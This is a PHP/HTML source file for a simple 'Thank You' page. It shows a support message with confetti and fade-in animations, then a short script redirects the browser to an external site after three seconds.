<?php
// Optionally add PHP logic here if needed
?>

<!doctype html>
<html lang="en">

<head>
    <title>Thank You</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
        }

        .message {
            font-size: 2rem;
            font-weight: bold;
            color: #DA251C;
            animation: fadeInUp 1s ease-in-out;
        }

        .confetti {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .confetti div {
            position: absolute;
            width: 10px;
            height: 10px;
            background: rgba(0, 0, 0, 0.5);
            opacity: 0;
            animation: confetti 3s infinite;
        }

        /* Confetti Animation */
        @keyframes confetti {
            0% {
                transform: translateY(0) rotate(0);
                opacity: 1;
            }

            100% {
                transform: translateY(500px) rotate(360deg);
                opacity: 0;
            }
        }

        /* Fade-in and slide-up animation */
        @keyframes fadeInUp {
            0% {
                opacity: 0;
                transform: translateY(50px);
            }

            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="message">Together, we’re making a better world. Thank you for your support!</div>
        <div class="confetti">
            <!-- Randomly positioned confetti squares -->
            <div style="left: 10%; animation-delay: 0s;"></div>
            <div style="left: 20%; animation-delay: 0.1s;"></div>
            <div style="left: 30%; animation-delay: 0.2s;"></div>
            <div style="left: 40%; animation-delay: 0.3s;"></div>
            <div style="left: 50%; animation-delay: 0.4s;"></div>
            <div style="left: 60%; animation-delay: 0.5s;"></div>
            <div style="left: 70%; animation-delay: 0.6s;"></div>
            <div style="left: 80%; animation-delay: 0.7s;"></div>
            <div style="left: 90%; animation-delay: 0.8s;"></div>
        </div>
    </div>
    <script>
        function to_thank_you_page(){
            setInterval(() => {
                window.location.href = "https://asraaigl.com/";
            }, 3000);
        }
        to_thank_you_page();
    </script>
</body>

</html>
